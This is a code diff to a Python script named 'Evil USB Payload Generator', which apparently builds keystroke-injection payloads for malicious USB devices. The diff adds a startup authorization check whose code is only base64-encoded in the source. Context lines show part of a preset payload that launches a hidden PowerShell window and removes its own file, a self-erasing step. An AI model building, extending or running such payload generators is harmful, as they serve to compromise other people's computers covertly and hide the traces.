@@ -2,6 +2,8 @@ import os
 import random
 import re
 import warnings
+import base64
+import time
 
 # Suppress syntax warnings
 warnings.filterwarnings("ignore", category=SyntaxWarning)
@@ -13,7 +15,7 @@ ASCII_ART = r'''
 / . \| . || ' ' || | || | |<_-<| . \
 \___/|_|_||_|_|_|`_. |`___|/__/|___/
                  <___'              
-                   
+                  
 '''
 
 # Predefined payloads
@@ -56,6 +58,19 @@ STRING powershell -nop -w hidden -c "Start-Sleep -s 3; Remove-Item -Path $MyInvo
 ENTER
 '''
 }
+
+def authorize():
+    print("\nAuthorization Required")
+    encoded = "dXNi"  
+    start_time = time.time()
+    entered = input("Enter authorization code (you have 60 seconds): ").strip()
+    elapsed = time.time() - start_time
+    if elapsed > 60:
+        print("[!] Authorization timed out. Exiting...")
+        exit(1)
+    if entered != base64.b64decode(encoded).decode():
+        print("[!] Unauthorized access. Exiting...")
+        exit(1)
 
 def list_payloads():
     print("\nAvailable Payloads:")
@@ -111,6 +126,7 @@ def save_payload(payload):
         print(f"[!] Error saving file: {e}")
 
 def main():
+    authorize()
     print(ASCII_ART)
     print("Evil USB Payload Generator")
     print("[1] Use preset payload")
